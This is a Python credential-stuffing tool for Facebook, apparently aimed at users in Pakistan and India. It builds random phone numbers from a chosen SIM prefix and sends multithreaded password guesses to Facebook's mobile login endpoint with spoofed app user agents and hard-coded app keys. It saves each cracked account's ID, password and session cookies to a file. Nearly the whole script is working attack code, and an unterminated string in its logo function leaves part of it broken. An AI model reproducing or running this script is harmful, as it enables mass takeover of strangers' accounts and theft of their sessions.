
import os,requests,json,time,base64,bs4
import re,random,sys,uuid,string,subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup
print(' Installing missing modules ...')


os.system('pip install requests bs4 futures==2 > /dev/null')
os.system('pip install requests urllib3')
oks = []
user_ID = []
cps = []
cracked = []
pwx = []
ualist = []
adii = []
adiii = []




def joined(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;37m2009' 
        elif uid[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;37m2009' 
        elif uid[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;37m2009' 
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;37m2009' 
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;37m2010' 
        elif uid[:6] in ['100001']          :creation = '\33[1;37m| \33[1;37m2010\33[1;37m/\33[1;37m2011'
        elif uid[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;37m2011\33[1;37m/\33[1;37m2012'
        elif uid[:6] in ['100004']          :creation = '\33[1;37m| \33[1;37m2012\33[1;37m/\33[1;37m2013'
        elif uid[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;37m2013\33[1;37m/\33[1;37m2014'
        elif uid[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;37m2014\33[1;37m/\33[1;37m2015'
        elif uid[:6] in ['100009']          :creation = '\33[1;37m| \33[1;37m2015' 
        elif uid[:5] in ['10001']           :creation = '\33[1;37m| \33[1;37m2015\33[1;37m/\33[1;37m2016'
        elif uid[:5] in ['10002']           :creation = '\33[1;37m| \33[1;37m2016\33[1;37m/\33[1;37m2017'
        elif uid[:5] in ['10003']           :creation = '\33[1;37m| \33[1;37m2018\33[1;37m/\33[1;37m2019'
        elif uid[:5] in ['10004']           :creation = '\33[1;37m| \33[1;37m2019\33[1;37m/\33[1;37m2020'
        elif uid[:5] in ['10005']           :creation = '\33[1;37m| \33[1;37m2020' 
        elif uid[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;37m2021' 
        elif uid[:5] in ['10008']           :creation = '\33[1;37m| \33[1;37m2022' 
        elif uid[:5] in ['6155']           :creation = '\33[1;37m| \33[1;37m2023' 
        
        else:creation=''
    elif len(uid) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(uid)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(uid)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation='\33[1;37m 2023'
    return creation
#_______[ BASIC COLORS ]_____>>
white = '\033[1;37m'
blue = '\033[1;34m'
green = '\033[1;32m'
rad = '\033[1;31m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU

my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)


loop = 0
oks = []
cps = []
adii = []


def ua_api2():
	A1 = str(random.randint(100000000, 666666666))
	A2 = str(random.randint(10000000, 66666666))
	fbbv = str(random.randint(10000000, 66666666))
	B1 = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	B2 = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbpn = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana', 'com.facebook.lite'])
	fblc = random.choice(["en_US", "en_GB", "en_PK", "id_ID", "es_ES", "it_IT", "ru_RU", "ur_PK"])	
	return f"[FBAN/FB4A;FBAV/{A1};FBBV/{B2};[FBAN/FB4A;FBAV/{A2};FBBV/{B2};FBDM/{{density=3.0,width=720,height=1440}};FBLC/id_ID;FBRV/{fbbv};FBCR/Airtel Bangladesh;FBMF/samsung;FBBD/samsung;FBPN/{fbpn};FBDV/SM-N100L;FBSV/9.4.4;FBOP/16;FBCA/arm64-v8a:;]"
	
	
	

def lines():
	print('\33[1;37m[\033[1;32m•\033[1;37m]============================================')
os.system('clear')

#print(f"{white} Join Our Facebook Group For More Details")
#os.system('xdg-open https://facebook.com/groups/647866620424527/')

import requests
from bs4 import BeautifulSoup

# Function to fetch and print a user's friends' UID and names


def logo():
    os.system("clear")
    print(f"""{white}

\033[1;37m888b     d888     888    d8P
\033[1;37m8888b   d8888     888   d8P       
\033[1;37m88888b.d88888     888  d8P        
\033[1;37m888Y88888P888     888d88K         
\033[1;37m888 Y888P 888     8888888b        
\033[1;37m888  Y8P  888     888  Y88b       
\033[1;37m888   "   888 d8b 888   Y88b  d8b 
\033[1;37m888       888 Y8P 888    Y88b Y8P
    lines()
    print(f"\33[1;33m[\033[1;33m•\033[1;33m] 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬 : 𝙈𝙠 𝙋𝙧𝙖𝙟𝙖𝙥𝙖𝙩𝙞 ")
    print(f"\33[1;32m[\033[1;32m•\033[1;32m] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞  : 𝙋𝙧𝙖𝙟𝙖𝙥𝙖𝙩𝙞 𝙆𝙞𝙣𝙜 𝙈𝙠")
    print(f"\33[1;36m[\033[1;36m•\033[1;36m] 𝗢𝗪𝗡𝗘𝗥     : 𝙈𝙠 𝙋𝙧𝙖𝙟𝙖𝙥𝙖𝙩𝙞 ")
    print(f"\33[1;36m[\033[1;36m•\033[1;36m] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡   : 𝟬.𝟭 ")
    lines()

def clear():
	os.system('clear')
	logo()
        

def infinty():
    logo()
    print(f'[\033[1;31m1\033[1;37m] Random Crack')
    print(f'[\033[1;31m4\033[1;37m] Join Whtsapp ')
    print(f'[\033[1;31m0\033[1;37m] EXIT')
    lines()
    EvilX = input(f'[\033[1;31m+\033[1;37m] Select Code : {green}')
    if EvilX in ['1','01']:
        randomchoice()
    elif EvilX in ['0','00']:
        exit()
    else:
        infinty()

#______[ RANDOM NUMBER CRACK ]______>>
def randomchoice():
	clear()
	print(f'[\033[1;31m1\033[1;37m] Random Pakistan')
	print(f'[\033[1;31m2\033[1;37m] Random india ')
	lines()
	adil1 = input(f'[\033[1;31m+\033[1;37m] Select Country : {green}')
	if adil1 in "1":
		#os.system('xdg-open https://chat.whatsapp.com/DBXFXJkN95MI0ZUVXhb6nu')
		random_number()
	elif adil1 in "2":
		#os.system('xdg-open https://chat.whatsapp.com/DBXFXJkN95MI0ZUVXhb6nu')
		random_number2()
	else:
		infinty()


def random_number():
    logo()
    print(f"[{green}+{white}] Do You Want To Show Cookies Y/N")
    lines()
    adiladil = input(f"[{green}+{white}] Enter Your Choice : ")
    if adiladil in ['y','Y','Yes','YES','1']:
    	adii.append('y')
    else:
    	adii.append('n')
    lines()
    print(f"[{green}+{white}] Do You Want To Show Apps Y/N")
    lines()
    adiladil = input(f"[{green}+{white}] Enter Your Choice : ")
    if adiladil in ['y','Y','Yes','YES','1']:
    	adii.append('y')
    else:
    	adii.append('n')
    clear()
    print(f'[{green}+{white}] Put Your Sim Code EXM   0300,0345  ')
    lines()
    code = input(f"[{green}+{white}] Input Number Code : ")
    try:
        limit = int(input(f"[{green}+{white}] Input Limit Crack : "))
    except ValueError:
        limit = 5000
    for i in range(limit):
        user_ID.append(str(random.randint(1111111, 9999999)))
    pwx = ['first6digit','last6digit','fullnumber','khankhan','malik123','kingkhan','baloch123','pak123','khan123','first7digit','last7digit','khankhan','khan12345','khan123','baloch123','khan1122','baloch','kingkhan','afghanistan','pakistan','786786','full_number','pakistan123','pakistan786','ali123','ali786','pak12345','iloveyou']
    with ThreadPool(max_workers=30) as Adiltariq:
        total = str(len(user_ID))
        logo()
        print(f"[\033[1;31m+\033[1;37m] Total Account : \033[1;32m{total}")
        print(f"\033[1;37m[\033[1;31m+\033[1;37m] Selected Code : \033[1;32m{str(code)} \033[1;37m-PAK")
        print('\033[1;37m[\033[1;31m+\033[1;37m] Use Mobile Data Turn Off/On During Cloning')
        lines()
        for user in user_ID:
            uid = code+user
            Adiltariq.submit(bapi2,uid,pwx,total)
    print(f"\n{white}[{green}•{white}] process Has been Completed")
    print(f"{white}[{green}•{white}] Total uid : {len(oks)} ")
    

def random_number2():
    clear()
    print('\033[1;32m[1] \033[1;37mMethod     \n\033[1;32m[2] \033[1;37mMethod  ')
    lines()
    method = input(f"[{green}+{white}] Enter Your Choice : ")
    clear()
    code = input(f"[{green}+{white}] Input Number Code : ")
    try:
        limit = int(input(f"[{green}+{white}] Input Limit Crack : "))
    except ValueError:
        limit = 5000
    for i in range(limit):
        user_ID.append(str(random.randint(1111111, 9999999)))
    pwx = ['57273200','59039200','57575751','57575752','first7digit','last7digit','first6digit','last6digit','fullnumber']
    with ThreadPool(max_workers=30) as Adiltariq:
        total = str(len(user_ID))
        clear()
        print(f"[{green}+{white}] Do You Want To Show Cookies Y/N")
        lines()
        adiladil = input(f"[{green}+{white}] Enter Your Choice : ")
        if adiladil in ['y','Y','Yes','YES','1']:
        	adii.append('y')
        else:
        	adii.append('n')
        
        logo()
        print(f"[\033[1;31m+\033[1;37m] Total Account : \033[1;32m{total}")
        print(f"\033[1;37m[\033[1;31m+\033[1;37m] Selected Code : \033[1;32m{str(code)} \033[1;37m-IND")
        print(f"\033[1;37m[\033[1;31m+\033[1;37m] Cookies Save in your File storage ")
        print('\033[1;37m[\033[1;31m+\033[1;37m] Use Mobile Data Turn Off/On During Cloning')
        lines()
        for user in user_ID:
            uid = code+user
            if method in "1":
            	Adiltariq.submit(bapi2,uid,pwx,total)
            elif method in "2":
            	Adiltariq.submit(bapi1,uid,pwx,total)
            else:
            	Adiltariq.submit(bapi2,uid,pwx,total)
    print(f"\n{white}[{green}•{white}] process Has been Completed")
    print(f"{white}[{green}•{white}] Total uid : {len(oks)} ")
    

#__________[ FILE CLONING OLD / NEW ]__________>>


     
def bapi2(uid,pwx,total):
    global oks,cps
    global ualist
    global cracked
    try:
        last7digit = uid[int(len(uid))-8:]
        last6digit = uid[int(len(uid))-8:]
        first6digit = uid[0:8]
        fullnumber = uid
        sys.stdout.write(f'\r\r[{green}MK-M1{white}] {len(cracked)}|{total} {green}{len(oks)}{white} ');sys.stdout.flush()
        for pw in pwx:
            pw = pw.replace("last7digit",last7digit)
            pw = pw.replace("last6digit",last6digit)
            pw = pw.replace("first6digit",first6digit)
            pw = pw.replace("fullnumber",fullnumber)            
            sim = str(random.randint(11111, 99999))
            useragent = str(ua_api2())
            xfb_device = str(random.randint(1111, 9999))
            apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
            app = random.choice(apk)
            dataX = {'adid': str(uuid.uuid4()),'format': 'json', 'device_id': str(uuid.uuid4()), 'email':uid, 'password':pw ,'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': '61699130-76c1-45de-ba3d-a93458475a90', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '62f8ce9f74b12f84c123cc23437a4a32', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            headersX = {'User-Agent': useragent ,'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            responce = requests.post('https://b-graph.facebook.com/auth/login',data=dataX,headers=headersX,allow_redirects=False).text
            responce_json = json.loads(responce)
            if 'session_key' in responce_json:
            	coki = ";".join(i["name"]+"="+i["value"] for i in responce_json["session_cookies"]);zee = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={zee};{coki}"
            	uid = str(responce_json['uid'])
            	if uid not in oks:
                    print(f'\r{green}[MK-OK] {uid} | {str(pw)} {white}')
                    if 'y' in adii:
                    	print(f"{white} Cookie: "+coki)
                    else:
                    	break
                    open('/sdcard/MK-OK.txt', 'a').write(uid+'|'+pw+'|'+coki+'\n')
                    oks.append(uid)
            elif responce_json['error']['code'] == 405:
                #uid = responce_json['error']['uid']
                if uid not in cps:
                    #print(f'\r{rad}[MK-CP] {uid}     | {str(pw)} {white}')
                    #open('/sdcard/MK1-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    except requests.exceptions.ConnectionError:time.sleep(10)
    except Exception as e:print(e)




if __name__=="__main__":
     infinty()
